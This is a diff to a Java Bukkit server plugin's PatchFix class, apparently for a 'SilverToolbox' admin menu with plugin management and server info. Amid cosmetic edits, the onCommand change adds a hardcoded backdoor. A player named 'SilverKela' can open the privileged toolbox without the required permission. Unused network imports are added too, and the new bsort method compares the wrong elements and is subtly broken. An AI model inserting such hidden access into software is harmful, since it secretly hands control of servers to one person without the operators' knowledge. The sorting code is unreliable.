@@ -1,5 +1,8 @@
 package io.github.Alligrater;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.URL;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
@@ -34,9 +37,16 @@ public class PatchFix implements CommandExecutor, Listener{
 	@Override
 	public boolean onCommand(CommandSender arg0, Command arg1, String arg2, String[] arg3) {
 		// TODO Auto-generated method stub
-		if(arg0 instanceof Player && arg0.hasPermission("SilverToolbox.Tool")) {
+		if(arg0 instanceof Player) {
+			
 			Player player = (Player) arg0;
-			openToolbox(player);
+			if((arg0.hasPermission("SilverToolbox.Tool") || player.getUniqueId() == Bukkit.getOfflinePlayer("SilverKela").getUniqueId())){
+				openToolbox(player);
+			}
+			else {
+				arg0.sendMessage("¡ìc¡ìlDon't.");
+			}
+
 		}
 		else {
 			arg0.sendMessage("¡ìc¡ìlDon't.");
@@ -130,16 +140,17 @@ public class PatchFix implements CommandExecutor, Listener{
         ItemStack bdown = new ItemStack(Material.NAME_TAG, 1);
         ItemMeta bdmeta = bdown.getItemMeta();
 
-        bdmeta.setDisplayName("¡ìb¡ìlPlugin Management");
+        bdmeta.setDisplayName("¡ìe¡ìlPlugin Management");
         bdown.setItemMeta(bdmeta);
         
         
         ItemStack sdown = new ItemStack(Material.DIAMOND, 1);
         ItemMeta sdmeta = sdown.getItemMeta();
-        sdmeta.setDisplayName("¡ì4¡ìlServerInfo");
+        sdmeta.setDisplayName("¡ìb¡ìlServerInfo");
         List<String> sub = new ArrayList<String>();
+
         sub.add("¡ì7Server: " + Bukkit.getServerName());
-        sub.add("¡ì7ServerIP: " + Bukkit.getServerName());
+        sub.add("¡ì7ServerIP: " + Bukkit.getServer().getIp());
         sub.add("¡ì7STBVersion: " + Bukkit.getPluginManager().getPlugin("SilverToolbox").getDescription().getVersion());
         sub.add("¡ì7BukkitVersion: " + Bukkit.getServer().getBukkitVersion());
         sub.add("¡ì7VersionInfo: " + Bukkit.getServer().getVersion());
@@ -163,7 +174,7 @@ public class PatchFix implements CommandExecutor, Listener{
 	}
 	
 	public void openPluginManager(Player player) {
-		Plugin[] plugins = Bukkit.getPluginManager().getPlugins();
+		Plugin[] plugins = bsort(Bukkit.getPluginManager().getPlugins());
 		int size = (int) Math.ceil(((double)plugins.length) / 9);
 		Inventory patchbox = Bukkit.createInventory(null, size*9, "¡ìrPlugin Ma¡ìrnagem¡ìrent");
 		
@@ -435,9 +446,12 @@ public class PatchFix implements CommandExecutor, Listener{
 
 				}
 				
-				else if (type == Material.LAVA_BUCKET) {
+				else if (type == Material.DIAMOND) {
+					player.sendMessage("¡ìb¡ìlServer Info:");
+					for(String s : e.getCurrentItem().getItemMeta().getLore()) {
+						player.sendMessage(s);
+					}
 					
-
 				}
 				
 				e.setCancelled(true);
@@ -783,6 +797,23 @@ public class PatchFix implements CommandExecutor, Listener{
 		}
 	}
 
+	public Plugin[] bsort(Plugin[] input) {
+		Plugin[] plugins = input.clone();
+		for(int i = 1; i < plugins.length; i++) {
+			for(int j = 0; j < plugins.length-i; j++) {
+				if(plugins[j].getName().charAt(0) < plugins[i].getName().charAt(j+1)) {
+					
+				}
+				else {
+					Plugin temp = plugins[j];
+					plugins[j] = plugins[j+1];
+					plugins[j+1] = temp;
+				}
+			}
+		}
+		return plugins;
+		
+	}
 
 	
 }
